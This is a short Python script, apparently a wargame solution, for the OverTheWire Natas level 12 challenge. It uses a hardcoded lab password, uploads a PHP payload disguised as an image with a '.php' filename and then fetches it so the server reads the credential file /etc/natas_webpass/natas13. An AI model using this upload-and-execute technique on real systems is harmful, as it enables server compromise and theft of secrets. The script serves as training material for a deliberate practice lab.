# Natas12 python solution
# By Emil 'Dota' Bak, 2019

import requests
from bs4 import BeautifulSoup

# ***********************************************
URL = "http://natas12.natas.labs.overthewire.org/"

auth_name = 'natas12'
auth_pass = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# In this challenge, an 'image' file can be uploaded, however
# this file format requirement can be bypassed.

# A Php script which includes the password file.
php_payload = r'''<?php
    include("/etc/natas_webpass/natas13");
?>'''

FILE = dict(uploadedfile=(('hacky.php', php_payload)))
DATA = dict(filename='renamed.php')

r = s.post(URL, auth=(auth_name, auth_pass), files=FILE, data=DATA)

# For a proper solution, the link is traversed using 'BeautifulSoup'.
soup = BeautifulSoup(r.text, 'html.parser')
LINK = (soup.find_all('a')[0].get('href'))

r = s.get(URL+LINK, auth=(auth_name, auth_pass))

print r.text